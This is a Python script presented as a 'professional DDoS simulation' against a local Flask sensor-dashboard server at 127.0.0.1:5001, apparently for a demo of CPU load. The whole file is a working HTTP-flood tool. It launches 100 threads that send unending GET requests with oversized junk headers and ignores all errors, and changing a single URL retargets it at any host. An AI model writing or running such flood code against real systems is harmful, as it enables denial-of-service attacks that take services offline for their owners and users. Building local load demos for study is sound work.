import requests
import threading
import time

# UPDATED TARGET: We attack the MAIN PAGE now.
# This forces the server to render HTML (High CPU work)
# but does NOT touch the sensor data API.
TARGET_URL = "http://127.0.0.1:5001/"

print("⚠️  STARTING PROFESSIONAL DDoS SIMULATION...")
print("Flooding server with HTTP GET requests...")
print("OBSERVE: CPU will spike, but Temperature will remain real.")
print("Press Ctrl+C to STOP.")

def attack():
    while True:
        try:
            # We send a "Heavy" request with junk headers
            # This makes the Flask server work hard to process it
            headers = {"User-Agent": "Bot-Attack-Mode" * 50} 
            requests.get(TARGET_URL, headers=headers, timeout=0.1)
        except:
            pass

# Launch 100 threads to guarantee a visible CPU spike
threads = []
for i in range(100):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()
    threads.append(t)

print(f"🚀 Attack Launched with 100 parallel threads!")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n🛑 Attack Stopped.")